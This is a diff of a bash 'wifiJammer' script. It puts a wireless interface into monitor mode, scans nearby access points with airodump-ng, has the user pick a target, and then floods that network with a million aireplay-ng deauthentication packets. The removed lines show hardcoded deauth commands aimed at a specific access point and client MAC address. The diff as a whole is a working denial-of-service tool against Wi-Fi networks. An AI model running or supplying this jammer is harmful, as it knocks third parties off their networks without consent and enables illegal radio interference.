@@ -4,16 +4,32 @@ transparent="\e[0m"
 bReverse="\e[7;1m"
 title="\e[3;33m"
 warning="\033[1;31m"
+green="\033[1;32m"
 
-clear
-echo -e $warning"if you don't scan networks before, quit and do it"$transparent
-
-com="n"
 ans="n"
 i=0
 intSelected="none"
 $networkC
 allInterface=$(ip link show | grep '^[1-9]' | cut -d ' ' -f 2  | cut -d ":" -f -1)
+
+
+function restoreInterface {
+        echo -e $title"Restore your internet connection"$transparent
+        echo "Please wait..."
+       	sudo ifconfig $intSelected down
+       	sudo iwconfig $intSelected mode managed
+       	sudo ifconfig $intSelected up
+       	sudo service network-manager restart
+       	echo -e $green"Done."$transparent
+}
+
+function ctrl_c() {
+        restoreInterface
+        exit
+}
+
+#--------------------------Select an interface---------------------------
+clear
 while [ $ans != "y" ]
 do
 	for interface in $allInterface
@@ -25,6 +41,7 @@ do
 		read ans
 		if [ $ans = "y" ]; then
 			intSelected=$interface
+			break
 		fi
 		clear
 	done
@@ -36,58 +53,69 @@ if [ $intSelected = "none" ]; then
 fi
 
 
+echo "Change your mac adress"
 ./wifiJammer/src/monitor.sh $intSelected
+clear
+
+#Catch the ctrl_c event
+trap ctrl_c INT
 
 
+#--------------------------Scan Access Points around the device---------------------------
+echo -e $title"Stop with Ctrl-c when you find your target."$transparent
+rm -rf result/scanNetwork/scan-*
+sudo ./wifiJammer/src/monitor.sh $intSelected
+xterm -title "Search access point" -e sudo airodump-ng -a $intSelected -w result/scanNetwork/scan --ignore-negative-one
+clear
+
+#--------------------------Make the file more readable for the user---------------------------
 target="none"
 station=$(cat result/scanNetwork/scan-01.csv | awk "/BSSID/,/Station/" | cut -d "," -f 14 | grep -v "Station" | grep -v "ESSID" | sed "s/ /_/g")
 channel=$(cat result/scanNetwork/scan-01.csv | awk "/BSSID/,/Station/" | cut -d "," -f 4 | grep -v "Station" | grep -v "ESSID")
 bssid=$(cat result/scanNetwork/scan-01.csv | awk "/BSSID/,/Station/" | cut -d "," -f 1 | grep -v "Station" | grep -v "ESSID")
-
-for essid in $station
+nbStation=-2
+for nb in $bssid
 do
-	i=$[i+1]
-	echo -e $bReverse""$essid" "$i""$transparent
-	read ans
-	if [ $ans = "y" ]; then
-		target=$essid
-		break
-	fi
-
+	nbStation=$[nbStation+1]
 done
 
-if [ $target != "none" ]; then
-	arrB=($bssid)
-	arrC=($channel)
-	B=${arrB[i]}
-	C=${arrC[i]}
-	T=$target
+#--------------------------Select an access point---------------------------
+while [ $target = "none" ]
+do
+	i=0
+	for essid in $station
+	do
+		i=$[i+1]
+		if [ $essid != "" ]; then
+			echo -e $title"Please select an access point"$transparent
+			echo -e $green"We found $nbStation access points"$transparent
+			echo $bssid
+			echo $station
+			echo -e $bReverse""$essid" "$i""$transparent
+			read ans
+			if [ $ans = "y" ]; then
+				target=$essid
+				break
+			fi
+			clear
+		fi
+	done
+done
 
-	#need to be in the same channel
-	sudo iwconfig $intSelected channel $C
-
-	#jamm the network
-	sudo aireplay-ng -0 1000000 -a $B $intSelected -j
-
-
-fi
-
-if [ $com = "y" ]; then
-
-#scan network
-airodump-ng $intSelected
-#scan during 5 seconds and write the result in test-01.csv
-timeout 4 airodump-ng wlan1 -w test
+arrB=($bssid)
+arrC=($channel)
+B=${arrB[i]}
+C=${arrC[i]}
+T=$target
 
 
-
-#scann client
-airodump-ng $intSelected --bssid 02:1A:11:FD:D5:21 -c 11
+clear
+echo -e $title"Press ctrl_c to stop the jamming"$transparent
 #need to be in the same channel
-iwconfig $intSelected channel 11
+sudo iwconfig $intSelected channel $C
 #jamm the network
-aireplay-ng -0 1000000 -a 02:1A:11:FD:D5:21 $intSelected -j
-#jamm B8 client from the network
-aireplay-ng -0 1000000 -a 02:1A:11:FD:D5:21 $intSelected -j -c B8:27:EB:A4:46:21
+xterm -title "Jamm $essid" -e sudo aireplay-ng -0 1000000 -a $B $intSelected -j
+restoreInterface
 
-fi
+
+
